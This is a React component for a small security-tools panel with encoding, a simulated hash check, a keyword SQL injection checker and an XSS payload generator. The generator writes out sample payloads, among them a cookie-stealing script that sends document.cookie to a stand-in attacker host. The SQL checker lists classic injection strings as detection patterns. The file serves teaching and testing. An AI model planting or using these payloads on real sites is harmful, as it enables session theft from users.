
import React, { useState } from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Textarea } from '@/components/ui/textarea';
import { Checkbox } from '@/components/ui/checkbox';
import { Shield, AlertTriangle, Key, Copy, Send, RefreshCw, Terminal } from 'lucide-react';
import { toast } from 'sonner';

const SecurityToolsTabs: React.FC = () => {
  const [hashInput, setHashInput] = useState('');
  const [hashType, setHashType] = useState('md5');
  const [hashResult, setHashResult] = useState('');
  const [encodingInput, setEncodingInput] = useState('');
  const [encodingType, setEncodingType] = useState('base64');
  const [encodingResult, setEncodingResult] = useState('');
  const [sqlInput, setSqlInput] = useState('');
  const [sqlResult, setSqlResult] = useState('');
  const [xssPayload, setXssPayload] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const encodeString = () => {
    setIsLoading(true);
    try {
      let result = '';
      switch (encodingType) {
        case 'base64':
          result = btoa(encodingInput);
          break;
        case 'url':
          result = encodeURIComponent(encodingInput);
          break;
        case 'hex':
          result = Array.from(encodingInput)
            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
            .join('');
          break;
        default:
          result = btoa(encodingInput);
      }
      setEncodingResult(result);
      toast.success('String encoded successfully');
    } catch (error) {
      toast.error('Failed to encode string');
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  const decodeString = () => {
    setIsLoading(true);
    try {
      let result = '';
      switch (encodingType) {
        case 'base64':
          result = atob(encodingInput);
          break;
        case 'url':
          result = decodeURIComponent(encodingInput);
          break;
        case 'hex':
          result = encodingInput.match(/.{1,2}/g)?.map(byte => 
            String.fromCharCode(parseInt(byte, 16))
          ).join('') || '';
          break;
        default:
          result = atob(encodingInput);
      }
      setEncodingResult(result);
      toast.success('String decoded successfully');
    } catch (error) {
      toast.error('Failed to decode string');
      console.error(error);
    } finally {
      setIsLoading(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success('Copied to clipboard');
  };

  const checkForSQLInjection = () => {
    setIsLoading(true);
    
    // Simulate SQL injection analysis
    setTimeout(() => {
      const vulnerabilityPatterns = [
        "'", "\"", "--", "/*", "*/", ";", "OR 1=1", "' OR '1'='1", 
        "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT", "INFORMATION_SCHEMA"
      ];
      
      const foundPatterns = vulnerabilityPatterns.filter(pattern => 
        sqlInput.toLowerCase().includes(pattern.toLowerCase())
      );
      
      if (foundPatterns.length > 0) {
        setSqlResult(`Potential SQL injection detected!\n\nDetected patterns: ${foundPatterns.join(", ")}\n\nThese patterns are commonly used in SQL injection attacks. The input should be properly sanitized before being used in database queries.`);
      } else {
        setSqlResult("No obvious SQL injection patterns detected, but this doesn't guarantee the input is safe. Always use parameterized queries and proper input validation.");
      }
      
      setIsLoading(false);
    }, 1000);
  };

  const generateXSSPayload = (type: string) => {
    setIsLoading(true);
    
    let payload = '';
    switch (type) {
      case 'alert':
        payload = '<script>alert("XSS")</script>';
        break;
      case 'cookie':
        payload = '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>';
        break;
      case 'redirect':
        payload = '<script>window.location="https://malicious-site.com"</script>';
        break;
      case 'img':
        payload = '<img src="x" onerror="alert(\'XSS\')">';
        break;
      case 'event':
        payload = '<body onload="alert(\'XSS\')">';
        break;
      default:
        payload = '<script>alert("XSS")</script>';
    }
    
    setXssPayload(payload);
    setIsLoading(false);
    toast.success('XSS payload generated');
  };

  const xssPayloads = [
    { name: 'Basic Alert', value: 'alert' },
    { name: 'Cookie Stealer', value: 'cookie' },
    { name: 'Page Redirect', value: 'redirect' },
    { name: 'Image Payload', value: 'img' },
    { name: 'Event Handler', value: 'event' }
  ];

  return (
    <Tabs defaultValue="encoding" className="w-full">
      <TabsList className="grid grid-cols-2 md:grid-cols-4 mb-6">
        <TabsTrigger value="encoding">Encoding Tools</TabsTrigger>
        <TabsTrigger value="hash">Hash Tools</TabsTrigger>
        <TabsTrigger value="sql">SQL Injection</TabsTrigger>
        <TabsTrigger value="xss">XSS Payloads</TabsTrigger>
      </TabsList>
      
      <TabsContent value="encoding">
        <Card className="border-gray-700">
          <CardHeader>
            <CardTitle className="text-xl font-semibold flex items-center">
              <Key className="mr-2 h-5 w-5" /> Encoding/Decoding Tool
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="encodingInput">Input</Label>
              <Textarea 
                id="encodingInput" 
                placeholder="Enter text to encode or decode" 
                className="h-24" 
                value={encodingInput}
                onChange={(e) => setEncodingInput(e.target.value)}
              />
            </div>
            
            <div className="flex items-center gap-4">
              <div className="w-1/2">
                <Label htmlFor="encodingType">Encoding Type</Label>
                <Select value={encodingType} onValueChange={setEncodingType}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select encoding type" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="base64">Base64</SelectItem>
                    <SelectItem value="url">URL</SelectItem>
                    <SelectItem value="hex">Hexadecimal</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="flex items-end gap-2 mt-5">
                <Button 
                  onClick={encodeString} 
                  disabled={!encodingInput || isLoading}
                  className="w-full"
                >
                  {isLoading ? <RefreshCw className="h-4 w-4 animate-spin" /> : "Encode"}
                </Button>
                <Button 
                  onClick={decodeString} 
                  disabled={!encodingInput || isLoading}
                  variant="outline" 
                  className="w-full"
                >
                  {isLoading ? <RefreshCw className="h-4 w-4 animate-spin" /> : "Decode"}
                </Button>
              </div>
            </div>
            
            {encodingResult && (
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <Label htmlFor="encodingResult">Result</Label>
                  <Button 
                    variant="ghost" 
                    size="sm" 
                    onClick={() => copyToClipboard(encodingResult)}
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
                <div className="p-4 bg-black rounded-md font-mono text-sm overflow-x-auto">
                  {encodingResult}
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </TabsContent>
      
      <TabsContent value="hash">
        <Card className="border-gray-700">
          <CardHeader>
            <CardTitle className="text-xl font-semibold flex items-center">
              <Shield className="mr-2 h-5 w-5" /> Hash Analyzer
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="hashInput">Hash Value</Label>
              <Input 
                id="hashInput" 
                placeholder="Enter hash to analyze" 
                value={hashInput}
                onChange={(e) => setHashInput(e.target.value)}
              />
            </div>
            
            <div className="flex items-center gap-4">
              <div className="w-1/2">
                <Label htmlFor="hashType">Hash Type</Label>
                <Select value={hashType} onValueChange={setHashType}>
                  <SelectTrigger>
                    <SelectValue placeholder="Select hash type" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="md5">MD5</SelectItem>
                    <SelectItem value="sha1">SHA-1</SelectItem>
                    <SelectItem value="sha256">SHA-256</SelectItem>
                    <SelectItem value="sha512">SHA-512</SelectItem>
                    <SelectItem value="auto">Auto Detect</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="flex items-end mt-5">
                <Button 
                  onClick={() => {
                    setIsLoading(true);
                    // Simulated hash analysis (would connect to a real API in production)
                    setTimeout(() => {
                      setHashResult("This is a simulated hash analysis. In a real application, this would connect to a hash analysis API or database.");
                      setIsLoading(false);
                    }, 1000);
                  }} 
                  disabled={!hashInput || isLoading}
                  className="w-full"
                >
                  {isLoading ? <RefreshCw className="h-4 w-4 animate-spin" /> : "Analyze Hash"}
                </Button>
              </div>
            </div>
            
            {hashResult && (
              <div className="space-y-2">
                <Label htmlFor="hashResult">Analysis Result</Label>
                <div className="p-4 bg-black rounded-md font-mono text-sm">
                  {hashResult}
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </TabsContent>
      
      <TabsContent value="sql">
        <Card className="border-gray-700">
          <CardHeader>
            <CardTitle className="text-xl font-semibold flex items-center">
              <AlertTriangle className="mr-2 h-5 w-5" /> SQL Injection Analyzer
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="sqlInput">SQL Query or Input String</Label>
              <Textarea 
                id="sqlInput" 
                placeholder="Enter SQL query or input to analyze for potential injection vulnerabilities" 
                className="h-24" 
                value={sqlInput}
                onChange={(e) => setSqlInput(e.target.value)}
              />
            </div>
            
            <Button 
              onClick={checkForSQLInjection} 
              disabled={!sqlInput || isLoading}
              className="w-full"
            >
              {isLoading ? <RefreshCw className="h-4 w-4 animate-spin" /> : "Check for SQL Injection"}
            </Button>
            
            {sqlResult && (
              <div className="space-y-2">
                <Label htmlFor="sqlResult">Analysis Result</Label>
                <div className="p-4 bg-black rounded-md font-mono text-sm whitespace-pre-wrap">
                  {sqlResult}
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </TabsContent>
      
      <TabsContent value="xss">
        <Card className="border-gray-700">
          <CardHeader>
            <CardTitle className="text-xl font-semibold flex items-center">
              <Terminal className="mr-2 h-5 w-5" /> XSS Payload Generator
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
              {xssPayloads.map((payload) => (
                <Button 
                  key={payload.value}
                  variant="outline"
                  onClick={() => generateXSSPayload(payload.value)}
                  className="h-full"
                >
                  {payload.name}
                </Button>
              ))}
            </div>
            
            {xssPayload && (
              <div className="space-y-2">
                <div className="flex justify-between items-center">
                  <Label htmlFor="xssPayload">Generated Payload</Label>
                  <Button 
                    variant="ghost" 
                    size="sm" 
                    onClick={() => copyToClipboard(xssPayload)}
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
                <div className="p-4 bg-black rounded-md font-mono text-sm overflow-x-auto">
                  {xssPayload}
                </div>
                <p className="text-sm text-yellow-500 flex items-start">
                  <AlertTriangle className="h-4 w-4 mr-1 mt-0.5" /> 
                  For educational purposes only. Do not use on systems without permission.
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </TabsContent>
    </Tabs>
  );
};

export default SecurityToolsTabs;
